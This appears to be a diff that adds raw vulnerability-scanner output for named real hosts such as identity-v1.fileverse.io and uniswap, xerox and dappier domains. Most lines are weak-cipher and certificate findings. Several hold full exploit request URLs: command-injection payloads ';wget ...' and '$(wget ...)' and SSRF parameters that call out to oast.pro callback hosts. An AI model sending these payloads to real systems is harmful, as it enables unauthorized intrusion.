@@ -1,0 +1,46 @@
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da09rp2ai4kjlg9m3jpgebd7b8mydqxt3.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da09rp2ai4kjlg9m3jpgxias5r6g4zi4r.oast.pro;
+[CVE-2017-9506] [http] [medium] https://identity-v1.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://da09rp2ai4kjlg9m3jpgq44xb9q8if9sx.oast.pro
+[CVE-2021-33544] [http] [high] https://identity-v1.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://da09rp2ai4kjlg9m3jpgr1j1zbcuygknp.oast.pro)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da09rp2ai4kjlg9m3jpgissdqc5gqerdg.oast.pro;
+[weak-cipher-suites:tls-1.0] [ssl] [low] hub.stakedao.org:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] hub.kaito.ai:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] hub.stakedao.org:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] hub.uniswap.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] hub.kaito.ai:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] hub.uniswap.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] identity-v1.fileverse.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] identity-v1.fileverse.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] ilease-uat.eur.xerox.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] ilease.eur.xerox.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] image.uniswap.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] image.uniswap.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] images-dev.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] images-dev.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] images.dev.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] images.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] images.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] images.dev.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] ilease-uat.eur.xerox.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] ilease.eur.xerox.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] indexer.dev-api.arrakis.finance:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] indexer.dev-api.arrakis.finance:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] indexer.api.arrakis.finance:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] indexer.api.arrakis.finance:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] indexer.v5.api.beta.staging.across.to:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] indexer.v5.api.beta.staging.across.to:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] inference-grpc.uw2phx.cursor.baseten.co:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] inference-grpc.uw2phx.cursor.baseten.co:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[CVE-2018-1000600] [http] [high] https://identity-v1.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://da09rp2ai4kjlg9m3jpg8j4g87w3o9ec9.oast.pro
+[CVE-2020-5775] [http] [medium] https://identity-v1.fileverse.io/external_content/retrieve/oembed?endpoint=http://da09rp2ai4kjlg9m3jpgf8y7xe1fx4upg.oast.pro&url=foo
+[CVE-2017-0929] [http] [high] https://identity-v1.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://da09rp2ai4kjlg9m3jpgurdmmkophj5ws.oast.pro
+[CVE-2020-10770] [http] [medium] https://identity-v1.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://da09rp2ai4kjlg9m3jpghz4tdh7og7rbx.oast.pro/
+[CVE-2015-8813] [http] [high] https://identity-v1.fileverse.io/Umbraco/feedproxy.aspx?url=http://da09rp2ai4kjlg9m3jpgfj63jh8yijneg.oast.pro
+[CVE-2017-18638] [http] [high] https://identity-v1.fileverse.io/composer/send_email?to=FlLZ@ZEeo&url=http://da09rp2ai4kjlg9m3jpg1i59e3sys9hww.oast.pro
+[expired-ssl] [ssl] [low] indexer.dev-api.arrakis.finance:443 ["2026-06-19 00:31:24 +0000 UTC"]
+[self-signed-ssl] [ssl] [low] indexer-service-e3356d603ea367cd.infra.candide.dev:443
+[untrusted-root-certificate] [ssl] [low] ilease-uat.eur.xerox.com:443
+[untrusted-root-certificate] [ssl] [low] ilease.eur.xerox.com:443
+[self-signed-ssl] [ssl] [low] indexer-worker-sync-0d8e148549f11343.infra.candide.dev:443
+[kubernetes-fake-certificate] [ssl] [low] inference-grpc.mc-dev.baseten.co:443 ["Issuer: Kubernetes Ingress Controller Fake Certificate"]
+[self-signed-ssl] [ssl] [low] inference-grpc.mc-dev.baseten.co:443
